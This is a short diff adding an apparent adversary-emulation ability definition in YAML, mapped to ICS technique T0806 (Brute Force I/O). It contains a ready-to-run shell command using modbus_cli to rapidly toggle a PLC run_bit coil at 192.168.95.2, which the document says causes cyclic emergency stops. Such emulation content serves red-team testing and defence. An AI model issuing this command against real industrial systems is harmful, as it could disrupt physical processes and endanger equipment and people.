@@ -1,0 +1,15 @@
+---
+
+- id: f6a7b8c9-6666-6666-6666-000000000005
+  name: Modbus - Fuzz PLC Run Bit Coil
+  description: Rapidly toggle the PLC run_bit coil causing cyclic E-stops
+  tactic: impair-process-control
+  technique_id: T0806
+  technique_name: Brute Force I/O
+  executors:
+  - platform: linux
+    name: sh
+    command: >
+      ./modbus_cli 192.168.95.2 --port 502 fuzz_c 40 1 100 --wait 0.5
+    payloads:
+    - modbus_cli
